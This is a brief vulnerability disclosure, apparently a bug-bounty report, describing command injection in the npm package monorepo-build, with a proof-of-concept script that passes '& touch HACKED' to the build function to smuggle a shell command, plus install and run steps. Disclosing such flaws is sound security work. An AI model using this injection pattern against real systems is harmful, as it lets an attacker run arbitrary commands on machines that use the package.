# Description

Command Injection in monorepo-build

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var mb =require("monorepo-build");
mb.build("./","& touch HACKED","SHA-224");
```

2. Execute the following commands in terminal:

```
npm i monorepo-build # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output using ls command before and after the execution.
